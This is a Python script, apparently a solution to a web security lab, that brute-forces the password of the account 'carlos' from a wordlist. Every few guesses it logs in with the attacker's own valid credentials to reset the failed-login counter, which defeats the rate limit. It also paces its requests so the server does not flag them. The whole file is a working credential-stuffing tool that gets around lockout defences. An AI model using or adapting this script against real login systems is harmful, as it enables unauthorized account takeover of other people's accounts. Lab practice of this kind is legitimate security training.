import requests
import time

# Function to send a login request and return the status code
def send_login_request(url, username, password):
    data = {
        'username': username,
        'password': password
    }

    try:
        response = requests.post(url, data=data)
        return response.status_code
    except requests.RequestException as e:
        print(f"Error during login request: {e}")
        return None

# Function to alternate between your login and carlos's login attempts
def alternating_login(url, your_username, your_password, carlos_username, password_list, reset_after=3):
    attempt = 0

    for password in password_list:
        if attempt % reset_after == 0:
            # Log in using your own username and password to reset the counter
            print(f"Attempt {attempt + 1}: Logging in as {your_username} to reset counter.")
            status = send_login_request(url, your_username, your_password)
            if status == 200:
                print(f"Successfully logged in as {your_username}, counter reset.")
            else:
                print(f"Failed to reset login counter. Status code: {status}")
        
        # Alternate between your username and carlos
        if attempt % 2 == 0:
            # Send request as your username with your password
            status = send_login_request(url, your_username, your_password)
            print(f"Attempt {attempt + 1}: Username={your_username}, Password={your_password}, Status Code={status}")
        else:
            # Send request as carlos with password from the list
            status = send_login_request(url, carlos_username, password)
            print(f"Attempt {attempt + 1}: Username={carlos_username}, Password={password}, Status Code={status}")

            # Check for successful login (302 status code)
            if status == 302:
                print(f"\nSuccess! The password for Carlos's account is: {password}")
                print("Logging in as Carlos with the found password...")
                # Optional: Perform any additional actions after finding the password, e.g., login to Carlos's account
                break

        attempt += 1
        time.sleep(1)  # Ensure requests are sequential and avoid being flagged by the server

    print("Script has completed running.")

if __name__ == "__main__":
    # URL to the login page
    url = input("Enter the login URL (e.g., http://target.com/login): ").strip()

    # Your correct credentials
    your_username = input("Enter your username: ").strip()
    your_password = input("Enter your password: ").strip()

    # Target username
    carlos_username = "carlos"

    # Load passwords from a file for carlos
    password_file = input("Enter the path to the password list file: ").strip()

    # Read the passwords into a list
    try:
        with open(password_file, 'r') as file:
            password_list = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("Password file not found.")
        exit(1)

    # Run the alternating login function
    alternating_login(url, your_username, your_password, carlos_username, password_list)
